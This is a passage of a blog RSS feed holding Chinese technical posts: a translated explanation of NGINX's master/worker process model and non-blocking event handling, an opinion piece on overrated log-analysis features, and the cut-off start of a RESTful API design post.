&lt;p&gt;&lt;a href=&quot;http://www.nginx.com/resources/library/infographic-inside-nginx/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;《Inside NGINX》&lt;/a&gt;这个图表自上而下地从高层级的进程架构讲到了NGINX单个进程是如何处理多个连接的。本文再更详细的介绍一下。&lt;/p&gt;

&lt;h2 id=&quot;nginx&quot;&gt;开场白 - NGINX的进程模型&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/4f2bf7c2987e5f074fcd77990e4fbfe0.jpg&quot; alt=&quot;process-model&quot; title=&quot;process-model&quot;&gt;&lt;/p&gt;

&lt;p&gt;为了能更好的理解NGINX的设计，你需要知道NGINX是如何运行的。NGINX拥有一个主进程（master process，用来执行一些特权操作，比如读取配置和绑定端口号）、一定数量的工作进程（worker）和协助（helper）进程。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/f9f97c6ffa1403ea6adeb343a86509c4.jpg&quot; alt=&quot;process-list&quot; title=&quot;process-list&quot;&gt;&lt;/p&gt;

&lt;p&gt;在这个4核的服务器上，NGINX的主进程创建了4个工作进程和几个用来管理磁盘缓存内容的缓存协助进程（cache helper processes）。&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;架构为什么重要？&lt;/h2&gt;

&lt;p&gt;线程或者进程是所有Unix应用程序的基本组成单位。（从Linux操作系统的视角来说，线程和进程在很大程度上是一样的；最大的不同在于它们共享自己内存的多少。）线程或者进程是一个完备的指令集合，操作系统可以把它调度到一个CPU核心上运行。大部分复杂的应用程序并行地执行多个线程或者进程有两个原因：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;它们可以同时使用更多的CPU核心。&lt;/li&gt;
  &lt;li&gt;线程和进程能够使并行操作（举个例子，同时处理多个网络连接）变得很简单。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;进程和线程是消耗资源的。它们每个都要使用内存和其他操作系统资源，并且它们需要从CPU核心上切换来切换去（这个操作叫作上下文切换）。大部分当今的服务器都能够同时处理上百个轻量级，活动的线程或进程，但是当内存耗尽或者高I/O负载引起大量上下文切换的时候，服务器的性能下降得很厉害。&lt;/p&gt;

&lt;p&gt;常见的网络应用程序的架构是为每个网络连接单独分配一个线程或者进程。这个架构很简单并且很容易实现，但是当应用需要处理成百上千并发连接的时候这个架构就无法扩展了。&lt;/p&gt;

&lt;h2 id=&quot;nginx-1&quot;&gt;NGINX是如何工作的？&lt;/h2&gt;

&lt;p&gt;NGINX使用了没有什么悬念的进程模型，来合理利用可用的硬件资源：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;主进程（master process）执行一些特权操作，比如读取配置和绑定网络端口，然后创建少量的子进程（以下三种）。&lt;/li&gt;
  &lt;li&gt;缓存加载进程（cache loader process）在启动的时候把磁盘上的缓存载入到内存中，然后退出。它的调用频率很低，所以资源需求也很少。&lt;/li&gt;
  &lt;li&gt;缓存管理进程（cache manager process）会定期执行，并且对磁盘缓存中的内容进行删减，以保证缓存的大小在配置范围内。&lt;/li&gt;
  &lt;li&gt;工作进程（worker processes）会做余下的所有事情！它们会处理网络连接，读写磁盘，并且和上游（upstream）服务器进行交互。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在大部分情况下，NGINX的推荐配置是 - 一个CPU核心上运行一个工作进程 - 最大化利用硬件的资源。你可以通过把配置项&lt;code class=&quot;highlighter-rouge&quot;&gt;worker_processes&lt;/code&gt;的内容设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;auto&lt;/code&gt;来配置此功能：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;worker_processes auto;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;当NGINX服务器运行的时候，只有工作进程是繁忙的。每个工作进程以非阻塞（non-blocking）的方式来处理多个网络连接，从而减少了上下文切换的次数。&lt;/p&gt;

&lt;p&gt;每个工作进程只有一个线程，并且彼此独立地处理网络连接。工作进程可以通过共享内存（shared memory）来实现缓存数据、持久化的会话数据以及其他其资源的共享。&lt;/p&gt;

&lt;h2 id=&quot;nginx-2&quot;&gt;剖析NGINX工作进程&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/a7c2d831a320e345187fa15eb46151f2.jpg&quot; alt=&quot;inside&quot; title=&quot;inside&quot;&gt;&lt;/p&gt;

&lt;p&gt;每个NGINX工作进程以NGINX的配置信息进行初始化，然后主进程会把一些监听的套接字（socket）提供给它。&lt;/p&gt;

&lt;p&gt;NGINX工作进程以等待监听套接字上的事件作为开始（&lt;a href=&quot;http://nginx.org/en/docs/ngx_core_module.html?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&amp;amp;_ga=1.118629901.506501312.1479865310#accept_mutex&quot;&gt;accept_mutex&lt;/a&gt;和&lt;a href=&quot;http://www.nginx.com/blog/socket-sharding-nginx-release-1-9-1/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;kernel socket sharding&lt;/a&gt;）。当有新的网络连接建立，事件就会被创建。这些连接会被分配到一个状态机（state machine）上 - HTTP状态机是用得最多的，但是NGINX也为流（原始TCP）处理以及邮件协议（SMTP, IMAP, and POP3）实现了状态机。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/89ca4b39b933274e1127ea3ab62fe1a1.jpg&quot; alt=&quot;state-machine&quot; title=&quot;state-machine&quot;&gt;&lt;/p&gt;

&lt;p&gt;状态机本质上就是用来告诉NGINX如何处理请求的指令集合。大多数web服务器跟NGINX一样也使用类似的状态机 - 只是实现方式不同。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;状态机调度&lt;/h2&gt;

&lt;p&gt;可以把状态机想像成是国际象棋的比赛规则。每个HTTP的处理过程都是一局国际象棋比赛。棋盘一边是web服务器 - 一个可以快速作出决策的国际象棋大师。棋盘另一边是远程客户端 - 通过相对较慢的网络正在访问网站的web浏览器或者应用程序。&lt;/p&gt;

&lt;p&gt;当然，这个比赛规则可能会非常复杂。比如，web服务器可能需要和其他服务（对上游应用进行代理）进行交互，或者需要到认证服务器进行认证。web服务器中的第三方模块也可以扩展这个比赛规则。&lt;/p&gt;

&lt;h3 id=&quot;io&quot;&gt;基于阻塞i/o的状态机&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/e6278e83c2b0b395e632ed0a00020c17.jpg&quot; alt=&quot;blocking-io&quot; title=&quot;blocking-io&quot;&gt;&lt;/p&gt;

&lt;p&gt;回想一下我们对进程或者线程的描述：可以被操作系统调度到CPU核心上进行执行的完备指令集合。大部分web服务器和web应用程序都使用&lt;code class=&quot;highlighter-rouge&quot;&gt;一个连接对应一个进程&lt;/code&gt;或者&lt;code class=&quot;highlighter-rouge&quot;&gt;一个连接对应一个线程&lt;/code&gt;的模式来进行这场比赛。每个进程或者线程都包含了从头到尾进行这个比赛所需的指令。在服务器执行进程的过程中，进程大部分的时间都是处于&lt;code class=&quot;highlighter-rouge&quot;&gt;阻塞（‘blocked’）&lt;/code&gt;状态 - 等待客户端进行下一步操作。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;web服务器进程在监听套接字上等待新的连接（客户端初始的新比赛）。&lt;/li&gt;
  &lt;li&gt;当进程知道了这个比赛，它就开始进行这个比赛，并为了等待客户端的响应而阻塞所有的操作。&lt;/li&gt;
  &lt;li&gt;当比赛结束后，web服务器进程可能会等待一会看客户端是不是还想要再来一局（在持久（keepalive）连接的情况下）。如果连接关闭了（客户端没有响应或者超时），web服务器进程继续监听新的比赛。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;需要记住的是每个活动的HTTP连接（每一局国际象棋比赛）都需要一个独立的进程或者线程（一个象棋大师）来处理。这个架构简单并且通过第三方的模块（新的比赛规则）很容易扩展。但是，这个方案有很大的问题：每个相当轻量级的HTTP连接用一个文件描述符和很少的内存就能表示，但是却要映射到一个独立的线程或者进程上，线程和进程非常耗操作系统资源。这种做法从编程的角度来说很方便，但是却大量浪费资源。&lt;/p&gt;

&lt;h3 id=&quot;nginx-3&quot;&gt;NGINX是真正的国际象棋大师&lt;/h3&gt;

&lt;p&gt;你可能听说过&lt;a href=&quot;http://en.wikipedia.org/wiki/Simultaneous_exhibition?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;同时进行的国际象棋表演赛&lt;/a&gt;，即一个国际象棋大师同时跟N个对手下棋？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/cca4db701e20110dfc853037b24d01b4.jpg&quot; alt=&quot;Kiril Georgiev&quot; title=&quot;Kiril Georgiev&quot;&gt;&lt;/p&gt;

&lt;p&gt;(Kiril Georgiev在索非亚（保加利亚）同时跟360个人一起下棋。最终284胜，70平，6败。)&lt;/p&gt;

&lt;p&gt;这就是NGINX工作进程下棋的方式。每个工作进程（记住 - 一般情况下每个CPU核心对应一个工作进程）都是一个可以同时进行几百场（实际上是几十万场）比赛的国际象棋大师。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/5e3e94603a35de688e68a89eaa449132.jpg&quot; alt=&quot;non-blocking-io&quot; title=&quot;non-blocking-io&quot;&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;工作进程等待来自被监听的套接字和已经建立连接的套接字发出的事件。&lt;/li&gt;
  &lt;li&gt;套接字事件发生，然后工作进程处理它们：
    &lt;ul&gt;
      &lt;li&gt;在被监听的套接字上发生的事件意味着客户端又开始了新一轮的国际象棋比赛。工作进程需要创建一个新的网络连接套接字。&lt;/li&gt;
      &lt;li&gt;在已连接套接字上发生的事件意味着客户端走了一步棋。工作进程需要立刻进行响应。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;工作进程从来不会因为等待它的对手（客户端）进行响应而被阻塞。当它执行完之后，工作进程会立刻处理其他比赛中需要走的步，或者欢迎新玩家加入。&lt;/p&gt;

&lt;h2 id=&quot;io-1&quot;&gt;为什么这个架构比基于阻塞i/o，多进程的架构要快？&lt;/h2&gt;

&lt;p&gt;NGINX可以很好的扩展从而让每个工作进程支持几十万连接。每个新的连接会创建新的文件描述符并且额外消耗工作进程很少的内存。每个连接的额外开销非常少。NGINX进程可以被固定在CPU上。上下文切换相对来说并不频繁，只有当进程没情可做的时候才会发生。&lt;/p&gt;

&lt;p&gt;在阻塞i/o，每个进程只能处理一个连接的方案中，每个连接都需要大量的额外资源和开销，并且上下文切换（把CPU从一个进程切换到另一个进程）非常频繁。&lt;/p&gt;

&lt;p&gt;想得到更多的详细解释，可以看看这篇由Andrew Alexeev写的关于NGINX架构的&lt;a href=&quot;http://www.aosabook.org/en/nginx.html?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;文章&lt;/a&gt;，他是
NGINX Inc.的企业发展vp兼联合创始人。&lt;/p&gt;

&lt;p&gt;经过适当的&lt;a href=&quot;https://www.nginx.com/blog/tuning-nginx/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;系统调校&lt;/a&gt;，NGINX每个工作进程可以处理几十万的并发HTTP连接，并且可以毫无压力的扛住流量峰值（新比赛像河水一样涌来）。&lt;/p&gt;

&lt;h2 id=&quot;nginx-4&quot;&gt;更新配置和升级NGINX&lt;/h2&gt;

&lt;p&gt;NGINX只拥有数量很少的工作进程，这种进程架构使得更新NGINX配置甚至其程序本身都非常的高效。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/bc896c31ee9c5dda47914b7e28f7d8a0.jpg&quot; alt=&quot;reload-configuration&quot; title=&quot;reload-configuration&quot;&gt;&lt;/p&gt;

&lt;p&gt;更新NGINX的配置是个非常简单，轻量级并且可靠的操作。这通常意味着运行&lt;code class=&quot;highlighter-rouge&quot;&gt;nginx –s reload&lt;/code&gt;命令，这个命令会去检查磁盘上的配置，然后向主进程发送SIGHUP信号。&lt;/p&gt;

&lt;p&gt;当主进程接收到SIGHUP信号，它会做两件事情：
1. 重新加载配置并创建一组新的工作进程。这些工作进程立刻开始接收网络连接并且处理请求（使用新的配置）。
2. 让旧的工作进程优雅的退出。工作进程停止接收新的连接。当每个遗留的HTTP请求处理完毕之后，工作进程关闭连接（这意味着不会存在长连接）。当所有的连接都关闭之后，工作进程退出。&lt;/p&gt;

&lt;p&gt;重新加载配置的过程可能会使CPU和内存使用率出现一个小的峰值，但是通常情况下跟活动连接的资源负载相比微乎其微。你可以每秒重新加载配置多次（事实上很多NGINX使用者就是那么做的）。当很多组NGINX工作进程在等待连接被关闭的时候会发生一些问题，但是很少见，即使出现也很快就能解决。&lt;/p&gt;

&lt;p&gt;NGINX二进制程序的升级过程把高可用发挥到了极致 - 你可以迅速的完成升级，并且不会导致任何连接丢失、宕机或者服务中断。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/a435f70d87e1dc71037dd71364b27293.jpg&quot; alt=&quot;upgrade-binary&quot; title=&quot;upgrade-binary&quot;&gt;&lt;/p&gt;

&lt;p&gt;二进制程序的升级过程和优雅的重新加载配置的方案是相似的。NGINX新的主进程会和原始的主进程同时运行，并且他们之间共享监听的套接字。这两个进程都处于活动状态，并且它们各自的工作进程都可以处理网络请求。之后就可以向旧的主进程和其工作进程发送信号，使其优雅的退出。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://nginx.org/en/docs/control.html?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&amp;amp;_ga=1.98190747.506501312.1479865310&quot;&gt;《Controlling NGINX》&lt;/a&gt;这篇文章中更加详细的描述了这整个过程。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;总结&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://www.nginx.com/resources/library/infographic-inside-nginx/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;《Inside NGINX infographic》&lt;/a&gt;这篇文章从高视角简述了NGINX的工作原理，但是简单解释的背后却是十年以上的创新和优化工作，从而使NGINX可以在大范围的硬件上表现出最好的性能，并且还要同时满足现代web应用对安全和可用性的需求。&lt;/p&gt;

&lt;p&gt;如果你想要了解更过关于NGINX的优化方法，可以看看这些不错的资源：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;a href=&quot;http://www.nginx.com/resources/webinars/installing-tuning-nginx/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;Installing and Tuning NGINX for Performance&lt;/a&gt; (webinar; Speaker Deck有&lt;a href=&quot;https://speakerdeck.com/nginx/nginx-installation-and-tuning?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;PPT&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.nginx.com/blog/tuning-nginx/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;Tuning NGINX for Performance&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.aosabook.org/en/nginx.html?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;The Architecture of Open Source Applications – NGINX&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
&lt;a href=&quot;http://www.nginx.com/blog/socket-sharding-nginx-release-1-9-1/?utm_source=inside-nginx-how-we-designed-for-performance-scale&amp;amp;utm_medium=blog&quot;&gt;Socket Sharding in NGINX Release 1.9.1&lt;/a&gt; (使用SO_REUSEPORT套接字配置项)&lt;/li&gt;
&lt;/ul&gt;

    （全文完）

	&lt;!-- disqus start --&gt;
	
	
	
	
	&lt;!-- disqus end --&gt;

	&lt;!-- related start --&gt;
	
	&lt;!-- related end --&gt;

</description>
        <pubDate>Fri, 25 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-11-25-inside-nginx-how-we-designed-for-performance-scale.html-7fbdb0dba.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-11-25-inside-nginx-how-we-designed-for-performance-scale.html-7fbdb0dba.html</guid>
        
        
        <category>weizhifeng</category>
        
      </item>
    
      <item>
        <title>日志分析中 6 个常见但没啥用的功能</title>
        <description>

  
  &lt;div style=&quot;background-color: #FFF;&quot;&gt;
    &lt;p&gt;日志分析是 IT 运维领域非常重要的一部分工作。甚至可以说，在平台化、模块化、服务化盛行的今天，这部分工作的重要性已经逼近传统的设备监控。不过日志由于来源、使用者、管理者都比设备指标要复杂，导致日志分析的功能需求，也庞大很多。在这些庞大的，或者说『泥沙俱下』的功能需求中，有那么一些然并卵的，或许因为听起来很炫酷，或许因为想延续过去的使用习惯，今天因为出差到外地，难得有空放松下，决定吐槽几个这种然并卵的功能。&lt;/p&gt;
&lt;h2 id=&quot;realtime-alert&quot;&gt;realtime alert&lt;/h2&gt;
&lt;p&gt;排在第一位的就是所谓的『实时告警』。做一个告警系统，其实可以分成两类不同的目的：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;出现了问题要修复，&lt;/li&gt;
  &lt;li&gt;快要出问题得避免。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么分开说：&lt;/p&gt;
&lt;p&gt;如果是要喊人来修复的，假设你的告警内容已经细化到完全不用再排查问题，从告警发出来，到你登录到服务器解决问题，至少也需要数分钟级别 —— 根据墨菲定律，这时候你很可能在睡觉在吃饭在坐车在团建，那么十分钟已经是你行动迅速了。那么告警是第 0.1 秒发出来的，跟是第 10 秒发出来的，有什么区别？而把告警从间隔 10 秒压缩到 1 秒内的实时，需要花费的架构调整和成本上升，可不是一点半点……（你说一个关键字实时过滤没啥成本？那你需要先加强一下告警系统的追踪、扩展、抑制等功能呢，告警没那么简单）&lt;/p&gt;
&lt;p&gt;如果是要提前避免的，一般你的基础架构已经进化的不错了，才会想要通过告警的触发动作来自动化修改你的流量、资源和任务调度编排。这种需求其实更多归入容量规划范畴，很难想象这种事情要实时性干嘛，谁家平台不打余量的？&lt;/p&gt;
&lt;p&gt;当然，不管上面哪种，我吐槽的都是追求 1 秒甚至毫秒的实时。如果你的监控间隔还停留在 5 分钟以上，可别拿我这段话做挡箭牌 —— 如果你从收到告警到解决问题需要小时级别，5 分钟可能是也不算多，但是你的故障定位方式，或者说告警系统的内容细化水平，更加需要提高。&lt;/p&gt;
&lt;h2 id=&quot;section&quot;&gt;翻页翻页翻页&lt;/h2&gt;
&lt;p&gt;排在第二位的就是 show me more money，错了，logline。日志分析系统一般都会在界面上列出来日志原文供查看。而一帮『手贱』的人，就会很 happy 地点下一页下一页下一页下~一~页~下~然后系统出问题了。&lt;/p&gt;
&lt;p&gt;这个功能需求其实就是过去 &lt;code class=&quot;highlighter-rouge&quot;&gt;cat logfile | grep KEYWORD | less&lt;/code&gt; 习惯的遗毒。上来就恨不得自己能 vim 进去一行行开始看日志。Ctrl+F 嗷嗷翻页固然很爽，不知不觉中时间全都浪费掉了 —— 想想上一条你还想要的『实时』 —— 运维排查问题最适合的思路是快速试错！一个想法验证下不行赶紧验证下一个。如果一页 20 条日志你看不出来，两页 40 条日志你看不出来，你就赶紧改个时间段、改个关键词吧。&lt;/p&gt;
&lt;p&gt;当然，话说回来，老想着往后翻页，也有可能是真想不出来改用啥关键词。日志分析系统有必要提供帮助用户更快找到合适关键词的能力。这东西就是仪表盘可视化。利用正确的能力做正确的事，而不应该在有正确的方法的情况下继续使用麻烦办法。&lt;/p&gt;
&lt;h2 id=&quot;section-1&quot;&gt;经纬度地图&lt;/h2&gt;
&lt;p&gt;既然说到可视化，可视化方面是做日志分析乃至数据分析最容易误入歧途的方向了。有兴趣的可以看下面几个链接，是我从 Kibana Plugin 社区讨论组里复制过来的：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.businessinsider.com/the-27-worst-charts-of-all-time-2013-6?op=1&amp;amp;IR=T&quot;&gt;http://www.businessinsider.com/the-27-worst-charts-of-all-time-2013-6?op=1&amp;amp;IR=T&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://flowingdata.com/category/visualization/ugly-visualization/&quot;&gt;http://flowingdata.com/category/visualization/ugly-visualization/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些很复杂的可视化就不提了。在日志分析方面，最常见的一个炫酷的效果就是地图。地图可真是一个被各种玩出花来的东西，诸如安全攻击喜欢放个 3D 地球，在 google 图片上随便搜『DDoS atack earth』关键词，大把大把；做个推广活动，喜欢搞个实时连线的中国地图看 PV，全国各地，来一个访问，飞一个点出来到北京。。。&lt;/p&gt;
&lt;p&gt;真的是酷毙了。不过，然后呢？你看到这个点能干嘛？而且飞动中的点，唰唰就过去了，压根捕捉不到。&lt;/p&gt;
&lt;p&gt;说到实际情况，IT 日志分析需要地图的大多数时候是基于行政区划的统计。全局负载均衡绝大多数都是以行政区划和运营商为基准做的划分，如果通过地图真的定位到什么访问问题，很大可能下一步你能做的是通过商务手段去联系当地电信服务运营商！你要经纬度有什么用？—— 别忘了免费的 GeoIP 国内精准度本来就低。花点时间搞一个准确到地市运营商的 IP 地址库，才是最应该做的事情。&lt;/p&gt;
&lt;h2 id=&quot;etl-to-bi&quot;&gt;全量下载(etl to BI)&lt;/h2&gt;
&lt;p&gt;另一个和翻页有些类似的功能，就是要求全量日志下载。这种需求通常目的也是分两类，一类其实跟翻页是一个需求，不知道查啥内容，干脆要求把日志都下载回来自己慢慢折腾；另一类则是环境中有一些标准的 BI 软件，觉得日志分析软件的可视化和统计方法不够用，还是喜欢、习惯 BI，所以要求日志分析系统负责搜索，BI 系统负责分析。&lt;/p&gt;
&lt;p&gt;这块怎么说呢，列出来有些个人主观化，我个人不太觉得在 IT 运维领域，有啥是 BI 能做，而开源日志分析项目做不来的事情。退一步说：真要两个系统的结合，也应该是分层的架构。充分利用日志分析系统的分布式架构并行处理能力，将大量 map 操作在日志系统完成，将中间统计结果导入到 BI 中完成最后的 reduce 工作即可。&lt;/p&gt;
&lt;p&gt;非要把原日志（即使是归一化之后的结构数据）导入到 BI 里做统计，是一个耗时耗力的下下之选。&lt;/p&gt;
&lt;h2 id=&quot;sql&quot;&gt;SQL&lt;/h2&gt;
&lt;p&gt;第四个很常见的功能，就是 SQL。这甚至不是日志分析领域的毛病，在所有和数据相关的、非关系型数据库的数据存储系统上，都会有大把人问：有 SQL 支持么？&lt;/p&gt;
&lt;p&gt;就我的浅薄见识，对所有存储系统要 FUSE 挂载，对所有数据系统要 SQL 查询，应该是可以对等的两个吃力不讨好的工作了。在 Hadoop 上有无数个实现 SQL 的项目，哪怕 Hive 和 SparkSQL 这种级别的大项目在，我还是要说：研发同仁们想要 SQL，不就是觉得自己已经会 SQL，所以要无缝对接，不用学习新知识么？你们点开 Hive 文档，里面有多少是非标准 SQL 的函数功能？&lt;/p&gt;
&lt;p&gt;只有极少数基础的、简单的过滤和统计函数，可以横跨 API、SQL、DSL 等方式，在各平台上都通用。而你选择某个大数据平台的实际理由，大多是它的xxx yyy zzz亮点功能，很好，你需要自己搞一个 UDF 了……这还搞 SQL 有什么意义。&lt;/p&gt;
&lt;p&gt;从编程语言学来一个经验，对特定领域，采用特定领域语言，即 DSL 的设计方式，永远是更加高效、灵活、优秀的选择。&lt;/p&gt;
&lt;p&gt;在日志分析方面来说，抓住关键词检索、分组统计、上下文关联、时间序列这几个特性，你就可以抽象出来几个能覆盖足够场景的函数了，而借鉴命令行操作的形式，从左到右的书写习惯也比 SQL 的从右到左的形式更加符合数据流向的效果。&lt;/p&gt;
&lt;p&gt;熟悉日志分析领域的人可能看出来我是在给 SPL 写软文了……自 Splunk 发明 SPL 这种日志分析领域的 DSL 以来，已经有大批日志分析产品跟进了这个形式，SumoLogic、Rizhiyi、XpoLog、MicroSoft Azure、Oracle Cloud Management 等等。不过公平的说，上面一段要点，确实也可以提炼出来跟 SPL 不一样的 DSL 设计，比如说：更接近面向对象编程语言的链式调用函数，同样也符合这个习惯 —— 这也是 ELK 从 5.0 开始分发的 timelion 插件的选择。&lt;/p&gt;
&lt;h2 id=&quot;live-tail&quot;&gt;live tail&lt;/h2&gt;
&lt;p&gt;今天我能想到的最后一个恶习遗毒，同样还符合酷炫概念的功能，是 live tail，也有叫 web tail 或者 log tail 的。不知道从哪来的程序员情节，觉得终端的黑底白字最棒了，非要在浏览器页面上，通过 websocket 连接上某台服务器，实时查看某个日志文件的尾部滚动。或者简单说，就是一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;tail -F logfile&lt;/code&gt; 功能的网页化。&lt;/p&gt;
&lt;p&gt;由于网络的限制、浏览器渲染的限制(毕竟要很多酷炫效果呢)，这类功能一般实现出来带有诸多的限制：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;直接从 agent 建联，意味着后续的归一化结构是无法用来做复杂过滤的，同样还意味着跨平台能力削弱；&lt;/li&gt;
  &lt;li&gt;需要限制使用者的并发数，以及每个连接的流速。一般来说是每秒不许超过 1000 条 —— 人肉眼其实每秒也看不过来这么多数据；&lt;/li&gt;
  &lt;li&gt;为了限速，必须指定具体的 hostname 和 filename，无法使用通配符，无法跨文件关联查询；&lt;/li&gt;
  &lt;li&gt;为了解决跨文件，在同一页面上切分屏幕，考虑美观和视觉，最多也就是切分一次，即一次可以看两个文件的 tail。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我在最前面已经说到了，日志系统之所以现在重要性提高，就是因为日志前所未有的分散，两个分屏的 tail，有什么用？&lt;/p&gt;
&lt;p&gt;当然，回到这个伪需求的根本目的：我就是在调试而不是事后排错呢，怎么让我可以快速看到我横跨好几个模块的调试日志是否正常？&lt;/p&gt;
&lt;p&gt;这跟前面『无限翻页』类似：你真正需要的知道新入的日志有没有异常，而不是刷过去什么字样。通过 AND OR NOT 等过滤条件，通过时间排序，通过关联 ID，你完全可以在秒级得到更精准的、更有利于你阅读的日志。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;就写到这里吧，我犹豫很久要不要把人工智能机器学习写进来。考虑到异常探测和预测也算是机器学习的一部分，还是不一竿子打倒全部吧~~这里只说一句：我花时间翻了一打 IT 运维日志相关的机器学习论文，用神经网络的效果普遍比回归差。嗯~总之，大家老实干活就好了。&lt;/p&gt;
    &lt;hr&gt;
    
    &lt;hr&gt;
  &lt;!-- JiaThis Button BEGIN --&gt;
&lt;div class=&quot;jiathis_style&quot;&gt;
&lt;span class=&quot;jiathis_txt&quot;&gt;分享到：&lt;/span&gt;
&lt;a class=&quot;jiathis_button_tsina&quot;&gt;新浪微博&lt;/a&gt;
&lt;a class=&quot;jiathis_button_weixin&quot;&gt;微信&lt;/a&gt;
&lt;a class=&quot;jiathis_button_renren&quot;&gt;人人网&lt;/a&gt;
&lt;a class=&quot;jiathis_button_ydnote&quot;&gt;有道云笔记&lt;/a&gt;
&lt;a class=&quot;jiathis_button_gmail&quot;&gt;Gmail邮箱&lt;/a&gt;
&lt;a class=&quot;jiathis_button_twitter&quot;&gt;Twitter&lt;/a&gt;
&lt;a class=&quot;jiathis_button_googleplus&quot;&gt;Google+&lt;/a&gt;
&lt;a class=&quot;jiathis_button_hi&quot;&gt;百度空间&lt;/a&gt;
&lt;a class=&quot;jiathis_button_fb&quot;&gt;Facebook&lt;/a&gt;
&lt;a class=&quot;jiathis_button_douban&quot;&gt;豆瓣&lt;/a&gt;
&lt;a href=&quot;http://www.jiathis.com/share?uid=1589850&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;更多&lt;/a&gt;
&lt;a class=&quot;jiathis_counter_style&quot;&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var jiathis_config={
	data_track_clickback:true,
	summary:&quot;&quot;,
	ralateuid:{
		&quot;tsina&quot;:&quot;1035836154&quot;
	},
	shortUrl:false,
	hideMore:false
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://v3.jiathis.com/code/jia.js?uid=1589850&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
&lt;!-- JiaThis Button END --&gt;
&lt;!-- UY BEGIN --&gt;


&lt;!-- UY END --&gt;
  &lt;/div&gt;

</description>
        <pubDate>Tue, 15 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-11-15-important-unuseful-feature-in-log-analysis-78cdadf0b.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-11-15-important-unuseful-feature-in-log-analysis-78cdadf0b.html</guid>
        
        
        <category>chenlinux</category>
        
      </item>
    
      <item>
        <title>设计一个务实的RESTful API</title>
        <description>

	
	

	&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/544394fbc801eb0955bf47cb037999f8.jpg&quot; alt=&quot;REST&quot; title=&quot;REST&quot;&gt;&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api&quot;&gt;http://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;ul&gt;
